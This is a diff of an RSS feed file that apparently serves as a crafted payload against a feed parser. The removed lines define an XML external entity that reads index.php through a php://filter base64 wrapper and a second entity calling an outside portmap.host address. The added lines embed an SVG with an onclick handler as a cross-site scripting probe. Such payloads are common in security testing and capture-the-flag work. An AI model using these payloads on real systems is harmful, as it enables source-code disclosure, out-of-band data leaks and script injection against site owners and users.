@@ -1,17 +1,19 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-  <!DOCTYPE foo [  
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
-  <!ENTITY callhome SYSTEM "http://jancuk223344-20863.portmap.host:20863/?hello=1&there=2">
-]>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0">
+<svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+  <circle
+    cx="100"
+    cy="100"
+    r="100"
+    onclick="alert('You have clicked the circle.')" />
+</svg>
+
 <channel>
     <title>The Blog</title>
     <link>https://portmap.io</link>
     <description>A blog about things</description>
     <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
     <item>
-        <title>&xxe;</title>
+        <title>xss</title>
         <link>https://portmap.io</link>
         <description>a post</description>
         <author>dani@example.com</author>
